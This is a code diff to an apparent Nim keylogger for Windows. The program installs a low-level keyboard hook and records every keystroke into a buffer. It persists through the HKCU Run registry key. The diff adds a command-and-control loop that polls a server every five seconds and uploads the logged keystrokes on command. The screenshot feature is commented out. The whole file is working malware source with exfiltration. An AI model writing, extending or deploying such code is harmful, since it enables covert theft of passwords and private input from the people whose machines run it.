@@ -1,19 +1,26 @@
 import winim
-import std/bitops
 import std/strutils
 import pixie
-import streams
+import std/httpclient
+import std/times
+import std/registry
+import std/os
+
+let
+  C2_URL = "http://localhost:8080/"
 
 var
   hook*: HHOOK # hook handle
   kbdStruct*: KBDLLHOOKSTRUCT # contains keycode etc
   msg: MSG
   buf: seq[char]
+  client = newHttpClient()
+  time = cpuTime()
 
 proc Screenshot() =
   echo "[*] Taking screenshot"
 
-  let x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+  #[let x = GetSystemMetrics(SM_XVIRTUALSCREEN);
   let y  = GetSystemMetrics(SM_YVIRTUALSCREEN);
   let cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
   let cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
@@ -50,9 +57,18 @@ proc Screenshot() =
 
   DeleteDC(dcTarget);
 
-  file.close()
+  file.close()]#
 
   # todo: fix compilation error
+
+proc get_commands() =
+  var current_command = client.getContent(C2_URL)
+  if current_command == "screenshot":
+    Screenshot()
+  elif current_command == "log":
+    var data = newMultipartData()
+    data["data"] = cast[string](buf)
+    discard client.postContent(C2_URL, multipart=data)
 
 
 proc HookCallback*(nCode: cint; wParam: WPARAM; lParam: LPARAM): LRESULT {.stdcall.} =
@@ -63,17 +79,25 @@ proc HookCallback*(nCode: cint; wParam: WPARAM; lParam: LPARAM): LRESULT {.stdca
       if pressed[] != VK_SHIFT:
         var keyPressed = if shiftPressed: cast[ptr char](pressed)[] else: cast[ptr char](pressed)[].toLowerAscii()
         buf.add(keyPressed)
-        # echo buf
+        echo buf
+
+      var time_elapsed = cpuTime() - time
+      echo time_elapsed
+      if time_elapsed > 5: #every 5 seconds
+        get_commands()
+        time = cpuTime()
+
   return CallNextHookEx(hook, nCode, wParam, lParam)
 
 when isMainModule:
-  echo "[*] Adding to autostart via registry"  
+  echo "[*] Adding to autostart via registry"
   setUnicodeValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "NimLog", getAppFilename(), registry.HKEY_CURRENT_USER)
   echo "[*] Setting hook"
   hook = SetWindowsHookEx(WH_KEYBOARD_LL, cast[HOOKPROC](HookCallback), 0, 0)
   if bool(hook):
     Screenshot()
+    var time = cpuTime()
     while GetMessage(addr(msg), 0, 0, 0):
-      discard # get message events like key inputs
+      discard # get keyinputs
   else:
     echo "[!] Failed to set hook"
